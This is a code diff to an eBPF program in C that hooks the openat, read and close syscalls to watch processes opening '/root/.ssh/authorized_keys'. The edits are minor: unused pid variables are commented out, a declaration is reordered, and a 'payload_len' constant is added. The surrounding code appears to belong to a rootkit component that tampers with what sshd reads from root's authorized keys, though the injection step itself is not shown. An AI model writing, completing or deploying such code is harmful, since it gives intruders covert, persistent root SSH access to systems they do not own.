@@ -17,6 +17,7 @@ const volatile int target_ppid = 0;
 // The UserID of the user, if we're restricting
 // running to just this user
 const volatile int uid = 0;
+const volatile int payload_len = 0;
 
 // Map to hold the File Descriptors from 'openat' calls
 struct
@@ -65,7 +66,7 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     // pid is not used, not known why it's here
-    int pid = pid_tgid >> 32;
+    // int pid = pid_tgid >> 32;
     // Check if we're a process thread of interest
     // if target_ppid is 0 then we target all pids
     // struct task_struct *task = (struct task_struct *)bpf_get_current_task();
@@ -96,9 +97,9 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
     }
 
     // Now check we're opening authorized_keys
-    const char *ssh_authorized_keys = "/root/.ssh/authorized_keys";
     const int ssh_authorized_keys_len = 27;
-    char filename[ssh_authorized_keys_len];
+    const char *ssh_authorized_keys = "/root/.ssh/authorized_keys";
+    char filename[27];
     bpf_probe_read_user(&filename, ssh_authorized_keys_len, (char*)ctx->args[1]);
     for (int i = 0; i < ssh_authorized_keys_len; i++) {
         if (filename[i] != ssh_authorized_keys[i]) {
@@ -148,7 +149,7 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
 {
     // Check this open call is opening our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    int pid = pid_tgid >> 32;
+    // int pid = pid_tgid >> 32;
     unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
     if (pfd == 0) {
         return 0;
@@ -177,7 +178,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
 {
     bpf_printk("The read Exit Called\n");
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    int pid = pid_tgid >> 32;
+    // int pid = pid_tgid >> 32;
 
     // Lookup for buffer and size
     struct syscall_read_logging *data;
@@ -249,7 +250,7 @@ int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
 {
     // Check if we're a process thread of interest
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    int pid = pid_tgid >> 32;
+    // int pid = pid_tgid >> 32;
     unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
     if (check == 0) {
         return 0;
